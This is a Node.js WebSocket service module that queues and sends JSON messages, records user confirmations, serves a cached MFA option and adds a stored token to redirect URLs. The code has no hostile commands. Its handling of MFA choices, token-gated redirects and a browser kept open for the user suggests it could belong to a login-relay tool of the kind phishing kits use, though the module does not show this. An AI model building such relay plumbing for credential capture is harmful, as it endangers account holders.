/**
 * WebSocket Service
 * Manages WebSocket connections and messaging
 */

const { Server } = require('ws');
const globalState = require('../config/globals');

let wss = null;
let wsConnection = null;
let pendingQueue = [];

/**
 * Setup WebSocket server
 * @param {http.Server} server - HTTP server instance
 * @returns {Server} WebSocket server instance
 */
function setupWebSocket(server) {
    wss = new Server({ server });

    wss.on('connection', (ws) => {
        console.log('🔌 Client connected via WebSocket');
        wsConnection = ws;
        globalState.set('wsConnection', ws);

        // Flush any queued messages that were attempted before a connection existed
        if (pendingQueue.length > 0) {
            console.log(`📦 Flushing ${pendingQueue.length} queued WebSocket message(s)`);
            while (pendingQueue.length > 0) {
                const queued = pendingQueue.shift();
                try {
                    // Use connection directly to avoid double-queueing
                    if (wsConnection && wsConnection.readyState === 1) {
                        wsConnection.send(JSON.stringify(queued));
                        console.log('📤 Sent queued message to client:', queued.status || queued.type || 'data');
                    } else {
                        // Re-queue and break to avoid tight loop
                        pendingQueue.unshift(queued);
                        break;
                    }
                } catch (err) {
                    console.error('❌ Error sending queued WebSocket message:', err);
                }
            }
        }

        ws.on('close', () => {
            console.log('🔌 Client disconnected - but keeping browser open for user interaction');
            wsConnection = null;
            globalState.set('wsConnection', null);
        });

        ws.on('error', (error) => {
            console.error('WebSocket error:', error);
        });

        ws.on('message', (message) => {
            try {
                const data = JSON.parse(message);
                console.log('📨 Received WebSocket message:', data);

                // Handle user confirmation
                if (data.type === 'user_confirmation') {
                    globalState.set('globalUserConfirmed', data.confirmed || false);
                    console.log(`👤 User confirmation: ${globalState.get('globalUserConfirmed') ? 'CONFIRMED' : 'NOT CONFIRMED'}`);
                }

                if (data.type === 'request_mfa_option') {
                    const activeOption = globalState.get('activeMfaOption');
                    if (activeOption) {
                        console.log('📤 Sending cached MFA option to client request');
                        ws.send(JSON.stringify({
                            status: 'option_selected',
                            selectedOption: activeOption,
                            message: 'Cached MFA option'
                        }));
                    }
                }
            } catch (error) {
                console.error('❌ Error parsing WebSocket message:', error);
            }
        });
    });

    return wss;
}

/**
 * Send message to connected client
 * Automatically prefixes redirect URLs with the stored token
 * @param {Object} data - Data to send
 * @returns {boolean} Success status
 */
function sendToClient(data) {
    const connection = wsConnection || globalState.get('wsConnection');

    // Auto-prefix redirect URLs with token if available
    if (data.redirect) {
        const token = globalState.get('globalToken');
        if (token) {
            // Remove /ms/ prefix if present, and add /{token}/
            let redirect = data.redirect;
            if (redirect.startsWith('/ms/')) {
                redirect = redirect.replace('/ms/', '/');
            }
            if (!redirect.startsWith(`/${token}`)) {
                data.redirect = `/${token}${redirect}`;
            }
            console.log(`🔗 Redirect URL with token: ${data.redirect}`);
        }
    }

    if (connection && connection.readyState === 1) { // WebSocket.OPEN = 1
        try {
            connection.send(JSON.stringify(data));
            console.log('📤 Sent message to client:', data.status || data.type || 'data');
            return true;
        } catch (error) {
            console.error('❌ Error sending WebSocket message:', error);
            return false;
        }
    } else {
        // If no connection is present, queue the message for later delivery
        try {
            pendingQueue.push(data);
            console.log('📥 WebSocket not connected - queued message for later delivery:', data.status || data.type || 'data');
            return true;
        } catch (err) {
            console.error('❌ Error queueing WebSocket message:', err);
            return false;
        }
    }
}

/**
 * Get current WebSocket connection
 * @returns {WebSocket|null} WebSocket connection or null
 */
function getConnection() {
    return wsConnection || globalState.get('wsConnection');
}

/**
 * Check if client is connected
 * @returns {boolean} Connection status
 */
function isConnected() {
    const connection = getConnection();
    return connection !== null && connection.readyState === 1;
}

/**
 * Broadcast message to all connected clients
 * @param {Object} data - Data to broadcast
 * @returns {number} Number of clients notified
 */
function broadcast(data) {
    if (!wss) {
        console.log('⚠️ WebSocket server not initialized');
        return 0;
    }

    let count = 0;
    wss.clients.forEach((client) => {
        if (client.readyState === 1) {
            try {
                client.send(JSON.stringify(data));
                count++;
            } catch (error) {
                console.error('❌ Error broadcasting to client:', error);
            }
        }
    });

    return count;
}

module.exports = {
    setupWebSocket,
    sendToClient,
    getConnection,
    isConnected,
    broadcast
};

